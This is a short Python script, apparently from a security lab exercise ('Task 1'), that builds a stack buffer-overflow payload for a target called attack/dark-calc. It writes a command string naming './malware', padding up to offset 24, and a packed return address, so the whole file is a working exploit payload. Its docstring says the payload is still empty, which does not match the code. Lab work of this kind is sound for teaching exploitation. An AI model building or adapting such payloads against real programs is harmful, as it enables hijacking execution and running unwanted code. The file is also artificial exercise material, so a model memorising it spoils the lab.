#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys, struct

OFFSET = 24
TARGET = 0x401a70

cmd = b"./malware\x00"
payload = cmd + b"A" * (OFFSET - len(cmd)) + struct.pack("<Q", TARGET)
sys.stdout.buffer.write(payload)